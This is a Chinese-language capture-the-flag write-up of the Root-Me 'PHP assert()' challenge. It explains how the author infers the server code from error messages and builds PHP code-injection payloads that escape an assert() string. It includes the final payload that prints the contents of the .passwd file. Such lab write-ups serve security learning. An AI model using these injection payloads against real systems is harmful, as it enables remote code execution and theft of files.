## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[PHP assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)] [[解题报告](http://exp-blog.com/2019/01/02/pid-2679/)]

------

综合题型，做这题需要一定的 PHP 编程基础。此题全程使用 Burp Suite -> Repeater 工具方便调试 payloads 。

首先根据题意，可以知道目标是打开应用根目录下的 `.passwd` 文件。

搜索一下关于 PHP assert() 的语法，知道其函数定义为：

```php
// $assertion 为固定参数，如果它是字符串，它将会被 assert() 当做 PHP 代码来执行
// 亦即可以通过 assert() 注入 PHP 代码，这是这题的解题关键
bool assert ( mixed $assertion [, string $description ] )
```

点击挑战页面上的超链，发现 URL 上的请求参数会随之变化 `?page=${input}`，尝试直接打开 .passwd 文件，构造 GET 请求参数为 `?page=.passwd`，页面会回显报错：`'includes/.passwd.php'File does not exist` 。

![](http://exp-blog.com/wp-content/uploads/2019/01/3dc15ffed9be63d9c934cb857b981d35.png)

根据这个报错可以知道两个信息：

- 代码逻辑是在 `inlcudes` 目录下寻找目标文件
- GET 请求参数的拼接方式是 `'includes/${input}.php'`

为此尝试构造 GET 请求参数为 `?page=../.passwd` 进行路径穿越访问，出现检测到 hacking 的报错信息：

`Warning: assert(): Assertion "strpos('includes/../.passwd.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!`

![](http://exp-blog.com/wp-content/uploads/2019/01/c232ee0a73b0d77f2919411ed319df2e.png)

根据这个报错可以再推断两个信息：

- 这是 `assert()` 打印的
- 可以推断一部分的代码逻辑是这样的：
```php
// ${input} 是我们可以控制的注入位置
assert("strpos('includes/${input}.php', '..') === false")
```

又由于 `assert` 会把入参的字符串作为 PHP 代码执行，因此其中的 `strpos` 函数会被调用，而这个函数的作用明显是检测 `${input}` 中是否包含 `..` ，有则在页面报错 `Detected hacking attempt!`，为此可以进一步推测代码逻辑如下：

```php
if (assert("strpos('includes/${input}.php', '..') === false")) {
	// 正常代码
} else {
	// 异常代码：检测到路径穿越
	echo(${input} . " Detected hacking attempt!");
}
```

为了注入代码，先尝试绕过路径穿越的检测逻辑，为此构造 `${input}` 的 payloads 为 `','exp') || strpos('` 令到 `if` 条件恒真，于是发现新的报错信息 `'includes/','exp') || strpos('.php'File does not exist` 。

![](http://exp-blog.com/wp-content/uploads/2019/01/b058d22d2708fda931c3fd247f0bb382.png)

由此可以再进一步推断代码逻辑如下：

```php
if (assert("strpos('includes/${input}.php', '..') === false")) {
	$file = 'includes/${input}.php';
	if (exist($file)) {
		// 正常代码
	} else {
		// 异常代码：文件不存在
		echo($file . " File does not exist");
	}
} else {
	// 异常代码：检测到路径穿越
	echo(${input} . " Detected hacking attempt!");
}
```

至此只需要利用 `||` 逻辑增加 `if` 条件语句，就可以注入代码了。

首先构造 `${input}` 的 payloads 为 `','exp') || phpinfo() || strpos('` ，页面打印了 PHP 版本为 5.3.17，说明注入成功。

![](http://exp-blog.com/wp-content/uploads/2019/01/72490c3599fb7fa1e6d22ccf0a62713f.png)

而后只需要替换 `phpinfo()` 为查看 `.passwd` 内容的 PHP 语句，即可达到目的。

修改 payloads 为 `','exp') || file_get_contents("../.passwd") || strpos('`，尝试直接读取文件内容，却发现页面报错 `file_get_contents()` 函数无法找到文件。

![](http://exp-blog.com/wp-content/uploads/2019/01/af8a11ddc69cc177017be3a146592a63.png)

再次调整 payloads 为 `','exp') || file_get_contents(".passwd") || strpos('`，即去掉路径穿越，发现报错没有了，推断 `file_get_contents()` 函数是从 web 应用根目录开始找文件的。

![](http://exp-blog.com/wp-content/uploads/2019/01/77ab0b262593a5173fdf6a5956af6c10.png)

但是页面没有打印出 `.passwd` 文件的内容，说明还缺一个输出函数，此处使用 `print_r()` 函数（注意不能使用 `echo()`函数，因为它无返回值无法嵌入 `if`；也不能使用 `print()` 函数，因为它无法输出内容到页面）。

最终构造的 payloads 为：`','exp') || print_r(file_get_contents(".passwd")) || strpos('` 。

注入后得到 flag，完成挑战。

![](http://exp-blog.com/wp-content/uploads/2019/01/a6906b0416e3cc746b2135c3c0420185.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
